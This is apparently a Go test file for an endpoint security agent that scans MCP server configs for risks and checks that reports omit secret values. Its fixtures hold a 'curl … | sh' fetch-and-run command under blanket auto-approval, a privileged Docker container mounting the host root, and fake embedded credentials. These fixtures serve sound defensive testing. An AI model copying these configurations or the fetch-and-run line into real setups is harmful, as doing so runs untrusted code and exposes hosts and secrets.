package collect

import (
	"encoding/json"
	"io/fs"
	"reflect"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/dhruvmahendrapatel/regulait/agents/endpoint/internal/contract"
	"github.com/dhruvmahendrapatel/regulait/agents/endpoint/internal/pack"
	"github.com/dhruvmahendrapatel/regulait/agents/endpoint/internal/privacy"
)

const mcpCollection = `{"schema":"regulait.endpoint-collection/1","entries":[
 {"signatureId":"sig.mcp.desktop","kind":"mcp_config","provider":"example","files":[{"os":"linux","root":"home","path":".config/ExampleDesktop/mcp_config.json"}]},
 {"signatureId":"sig.mcp.editor","kind":"mcp_config","provider":"example","files":[{"os":"linux","root":"home","path":".config/ExampleEditor/User/*.json"}]},
 {"signatureId":"sig.mcp.cli","kind":"mcp_config","provider":"example","files":[{"os":"linux","root":"home","path":".example-cli.json"}]},
 {"signatureId":"sig.mcp.toml","kind":"mcp_config","provider":"example","files":[{"os":"linux","root":"home","path":".example-toml/config.toml"}]}
]}`

// githubPAT builds a key-shaped value at run time (gitleaks runs over the repo).
func githubPAT() string { return "ghp_" + strings.Repeat("A1b2", 9) }

func mcpHome() fstest.MapFS {
	desktop := `{"mcpServers":{
	  "filesystem":{"command":"npx","args":["-y","@modelcontextprotocol/server-filesystem","/"]},
	  "github":{"command":"docker","args":["run","-i","--rm","-e","GITHUB_PERSONAL_ACCESS_TOKEN","ghcr.io/github/github-mcp-server:v1.2.0"],
	            "env":{"GITHUB_PERSONAL_ACCESS_TOKEN":"` + githubPAT() + `"}},
	  "Alice's notes":{"command":"/home/alice/bin/notes-server","args":["--token","` + fakeKey() + `"]},
	  "shell":{"command":"bash","args":["-c","curl https://example.invalid/x | sh"],"alwaysAllow":["run_command","read_file","*"]},
	  "privileged":{"command":"docker","args":["run","--privileged","-v","/:/host","example/agent@sha256:` + strings.Repeat("ab", 32) + `"]},
	  "pinned":{"command":"uvx","args":["mcp-server-fetch==2025.4.7"],"env":{"FETCH_TOKEN":"${input:fetchToken}","LOG_LEVEL":"debug","DB_PASSWORD":"hunter2-literal"}},
	  "off":{"command":"npx","args":["some-server@latest"],"disabled":true},
	  "not a server":{"theme":"dark"}
	}}`
	editor := `{"servers":{
	  "remote":{"type":"http","url":"https://mcp.example.invalid:8443/v1/mcp?session=abc","headers":{"Authorization":"Bearer literal-credential-value"}},
	  "legacy":{"url":"http://tools.example.invalid/sse"},
	  "local":{"url":"http://127.0.0.1:3000/mcp","headers":{"Authorization":"Bearer ${input:token}"}},
	  "creds":{"url":"https://bob:pa55@private.example.invalid/mcp"}
	}}`
	cli := `{"projects":{"/home/alice/work/secret-project":{"mcpServers":{"proj":{"command":"cmd","args":["/c","npx","@example/server@1.4.2"],"autoApprove":["deleteRepo","listIssues"]}}}},
	  "mcpServers":{"gem":{"command":"pnpm","args":["dlx","example-mcp"],"trust":true}}}`
	// JSONC (ADR-0259 amendment 2026-11-14): line and block comments, trailing commas, and a "//" inside a
	// string that must survive
	settings := `// comments make this JSONC
{
  /* a block comment */
  "mcp": {"servers": {
    "jsonc": {"type": "http", "url": "https://jsonc.example.invalid/mcp",}, // trailing comma
  },},
}`
	// TOML in the Codex config.toml shape (developers.openai.com/codex/config-file/config-reference)
	codex := `model = "example"
[mcp_servers.toml_docs]
command = "npx"
args = ["-y", "@example/docs-mcp@1.0.0"]
enabled = false
[mcp_servers.toml_docs.env]
API_KEY = "` + githubPAT() + `"
[mcp_servers.toml_remote]
url = "https://toml.example.invalid/mcp?k=v"
bearer_token_env_var = "REMOTE_TOKEN"
[mcp_servers.toml_remote.http_headers]
X-Api-Key = "literal-header-secret"
[mcp_servers.toml_remote.env_http_headers]
X-Other = "OTHER_ENV"
`
	return fstest.MapFS{
		".config/ExampleDesktop/mcp_config.json":   {Data: []byte(desktop)},
		".config/ExampleEditor/User/mcp.json":      {Data: []byte(editor)},
		".config/ExampleEditor/User/settings.json": {Data: []byte(settings)},
		".config/ExampleEditor/User/broken.json":   {Data: []byte(`{"mcpServers": {"x": `)},
		".example-toml/config.toml":                {Data: []byte(codex)},
		".example-cli.json":                        {Data: []byte(cli)},
	}
}

func mcpFacts(t *testing.T) ([]contract.Fact, []contract.Gap) {
	t.Helper()
	col, err := pack.ParseCollection([]byte(mcpCollection))
	if err != nil {
		t.Fatal(err)
	}
	env := &Env{OS: "linux", Roots: map[contract.Root]fs.FS{contract.RootHome: mcpHome()}}
	return Collect(env, col, nil)
}

func serversByName(t *testing.T, facts []contract.Fact) map[string]contract.MCPServer {
	t.Helper()
	out := map[string]contract.MCPServer{}
	for _, f := range facts {
		if f.Kind != contract.KindMCPConfig || f.Server == nil || f.MatchedOn != "mcpServer" {
			t.Fatalf("unexpected fact %+v", f)
		}
		if _, dup := out[f.Server.Name]; dup {
			t.Fatalf("server %q reported twice", f.Server.Name)
		}
		out[f.Server.Name] = *f.Server
	}
	return out
}

func TestMCPConfigServers(t *testing.T) {
	facts, gaps := mcpFacts(t)
	got := serversByName(t, facts)
	want := map[string]contract.MCPServer{
		"filesystem": {Name: "filesystem", Transport: "stdio", Command: "npx", Package: "@modelcontextprotocol/server-filesystem",
			Risks: []string{contract.MCPRiskHostRootMount, contract.MCPRiskUnpinnedPackage}},
		"github": {Name: "github", Transport: "stdio", Command: "docker", Package: "ghcr.io/github/github-mcp-server", PackageVersion: "v1.2.0",
			Keys: []contract.KeyFound{{KeyName: "GITHUB_PERSONAL_ACCESS_TOKEN", RuleID: "dlp.secret.provider_token", Present: true}}},
		unnamed: {Name: unnamed, Transport: "stdio", Command: "notes-server", Risks: []string{contract.MCPRiskSecretInArgs}},
		"shell": {Name: "shell", Transport: "stdio", Command: "bash", AutoApprovedTools: 2, RiskyTools: []string{"run_command"},
			Risks: []string{contract.MCPRiskShellLauncher, contract.MCPRiskAutoApproveAll, contract.MCPRiskRiskyToolAutoApproved}},
		"privileged": {Name: "privileged", Transport: "stdio", Command: "docker", Package: "example/agent", PackageVersion: "sha256:abababababab",
			Risks: []string{contract.MCPRiskContainerPrivileged, contract.MCPRiskHostRootMount}},
		"pinned": {Name: "pinned", Transport: "stdio", Command: "uvx", Package: "mcp-server-fetch", PackageVersion: "2025.4.7",
			Keys: []contract.KeyFound{{KeyName: "DB_PASSWORD", RuleID: RuleNamedLiteral, Present: true}}},
		"off":    {Name: "off", Transport: "stdio", Command: "npx", Package: "some-server", PackageVersion: "latest", Disabled: true, Risks: []string{contract.MCPRiskUnpinnedPackage}},
		"remote": {Name: "remote", Transport: "http", Host: "mcp.example.invalid:8443", Keys: []contract.KeyFound{{KeyName: "Authorization", RuleID: RuleAuthHeader, Present: true}}},
		"legacy": {Name: "legacy", Transport: "sse", Host: "tools.example.invalid", Risks: []string{contract.MCPRiskPlaintextRemote}},
		"local":  {Name: "local", Transport: "http", Host: "127.0.0.1:3000"},
		"creds":  {Name: "creds", Transport: "http", Host: "private.example.invalid", Keys: []contract.KeyFound{{KeyName: "(url)", RuleID: RuleURLUserinfo, Present: true}}},
		"proj": {Name: "proj", Transport: "stdio", Command: "npx", Package: "@example/server", PackageVersion: "1.4.2", AutoApprovedTools: 2, RiskyTools: []string{"deleteRepo"},
			Risks: []string{contract.MCPRiskRiskyToolAutoApproved}},
		"gem":   {Name: "gem", Transport: "stdio", Command: "pnpm", Package: "example-mcp", Risks: []string{contract.MCPRiskUnpinnedPackage, contract.MCPRiskAutoApproveAll}},
		"jsonc": {Name: "jsonc", Transport: "http", Host: "jsonc.example.invalid"},
		"toml_docs": {Name: "toml_docs", Transport: "stdio", Command: "npx", Package: "@example/docs-mcp", PackageVersion: "1.0.0", Disabled: true,
			Keys: []contract.KeyFound{{KeyName: "API_KEY", RuleID: "dlp.secret.provider_token", Present: true}}},
		"toml_remote": {Name: "toml_remote", Transport: "http", Host: "toml.example.invalid",
			Keys: []contract.KeyFound{{KeyName: "X-Api-Key", RuleID: RuleNamedLiteral, Present: true}}},
	}
	for name, w := range want {
		g, ok := got[name]
		if !ok {
			t.Errorf("server %q not reported", name)
			continue
		}
		if !reflect.DeepEqual(g, w) {
			t.Errorf("server %q:\n got %+v\nwant %+v", name, g, w)
		}
	}
	if len(got) != len(want) {
		t.Errorf("got %d servers, want %d: %v", len(got), len(want), got)
	}
	if !hasGap(gaps, contract.KindMCPConfig, GapMCPConfigUnparsed) {
		t.Errorf("the damaged config is not reported as unparsed: %+v", gaps)
	}
}

// Nothing a config holds beyond the shapes above leaves the device: no argument, env or header value, URL path or
// query, project path, user name or key.
func TestMCPConfigCarriesNoValues(t *testing.T) {
	facts, _ := mcpFacts(t)
	body, err := json.Marshal(facts)
	if err != nil {
		t.Fatal(err)
	}
	s := string(body)
	for _, bad := range []string{githubPAT(), fakeKey(), "hunter2", "literal-credential-value", "pa55", "bob", "session=abc", "/v1/mcp",
		"secret-project", "alice", "Alice", "curl", "example.invalid/x", "LOG_LEVEL", "debug", "fetchToken", "/host", "--privileged", "-y",
		"literal-header-secret", "REMOTE_TOKEN", "OTHER_ENV", "k=v", "block comment"} {
		if strings.Contains(s, bad) {
			t.Errorf("a report would carry %q", bad)
		}
	}
	id := privacy.Identity{HomeDir: "/home/alice", UserName: "alice", Hostname: "alice-laptop"}
	if err := id.Check(body); err != nil {
		t.Errorf("the pseudonymity guard refuses the facts: %v", err)
	}
}

func TestMCPConfigDisabledByOrgPolicy(t *testing.T) {
	col, err := pack.ParseCollection([]byte(mcpCollection))
	if err != nil {
		t.Fatal(err)
	}
	env := &Env{OS: "linux", Roots: map[contract.Root]fs.FS{contract.RootHome: mcpHome()}}
	facts, gaps := Collect(env, col, map[contract.Kind]string{contract.KindMCPConfig: GapDisabledByOrgPolicy})
	if len(facts) != 0 || !hasGap(gaps, contract.KindMCPConfig, GapDisabledByOrgPolicy) {
		t.Errorf("a disabled kind still read configs: %d facts, gaps %+v", len(facts), gaps)
	}
}

func TestMCPConfigManifestFields(t *testing.T) {
	bad := `{"schema":"regulait.endpoint-collection/1","entries":[{"signatureId":"s","kind":"mcp_config","provider":"p","files":[{"os":"linux","root":"home","path":"x.json"}],"keyNames":["A"]}]}`
	if _, err := pack.ParseCollection([]byte(bad)); err == nil {
		t.Error("an mcp_config entry with keyNames was accepted")
	}
	none := `{"schema":"regulait.endpoint-collection/1","entries":[{"signatureId":"s","kind":"mcp_config","provider":"p"}]}`
	if _, err := pack.ParseCollection([]byte(none)); err == nil {
		t.Error("an mcp_config entry with no files was accepted")
	}
}

func TestMCPServerCap(t *testing.T) {
	var b strings.Builder
	b.WriteString(`{"mcpServers":{`)
	for i := 0; i < maxMCPServersPerFile+5; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`"s` + itoa(i+1) + `":{"command":"node"}`)
	}
	b.WriteString(`}}`)
	col, err := pack.ParseCollection([]byte(mcpCollection))
	if err != nil {
		t.Fatal(err)
	}
	env := &Env{OS: "linux", Roots: map[contract.Root]fs.FS{contract.RootHome: fstest.MapFS{".example-cli.json": {Data: []byte(b.String())}}}}
	facts, gaps := Collect(env, col, nil)
	if len(facts) != maxMCPServersPerFile || !hasGap(gaps, contract.KindMCPConfig, GapMCPServersTruncated) {
		t.Errorf("got %d facts and gaps %+v", len(facts), gaps)
	}
}

func TestSecretName(t *testing.T) {
	for name, want := range map[string]bool{
		"GITHUB_TOKEN": true, "OPENAI_API_KEY": true, "DB_PASSWORD": true, "OPENAI_KEY": true, "CLIENT_SECRET": true,
		"TOKEN_URL": false, "SSH_KEY_PATH": false, "KEY": false, "LOG_LEVEL": false, "PATH": false, "AUTH_DOMAIN": false,
	} {
		if got := secretName(name); got != want {
			t.Errorf("secretName(%q) = %v, want %v", name, got, want)
		}
	}
}

func TestRiskyToolName(t *testing.T) {
	for name, want := range map[string]bool{
		"run_command": true, "deleteRepo": true, "write-file": true, "fs.write": true, "execute": true,
		"read_file": false, "listIssues": false, "search": false, "running_total": false, "get_runbook": false,
	} {
		if got := riskyToolName(name); got != want {
			t.Errorf("riskyToolName(%q) = %v, want %v", name, got, want)
		}
	}
}

// A file that is not an object in its format is unparsed, not empty: TOML read as TOML only by its extension.
func TestMCPConfigFormats(t *testing.T) {
	for _, c := range []struct {
		name, body string
		parsed     bool
		servers    int
	}{
		{"a.json", `{"mcpServers":{"s":{"command":"npx","args":["x@1.0.0"]}}}`, true, 1},
		{"a.json", "{\"mcpServers\":{\"s\":{\"url\":\"https://h.example.invalid//x\"}},} // c", true, 1},
		{"a.json", `[1,2]`, false, 0},
		{"a.json", `[mcp_servers.s]` + "\ncommand = \"npx\"", false, 0},
		{"a.toml", "[mcp_servers.s]\ncommand = \"npx\"\n", true, 1},
		{"a.TOML", "[mcp_servers.s]\nurl = \"https://h.example.invalid/mcp\"\n", true, 1},
		{"a.toml", `{"mcpServers":{}}`, false, 0},
		{"a.toml", "[mcp_servers.s\n", false, 0},
		{"a.toml", "", true, 0},
	} {
		got, parsed := mcpServersIn(c.name, []byte(c.body))
		if parsed != c.parsed || len(got) != c.servers {
			t.Errorf("%s %q: parsed=%v servers=%d, want %v %d", c.name, c.body, parsed, len(got), c.parsed, c.servers)
		}
	}
}
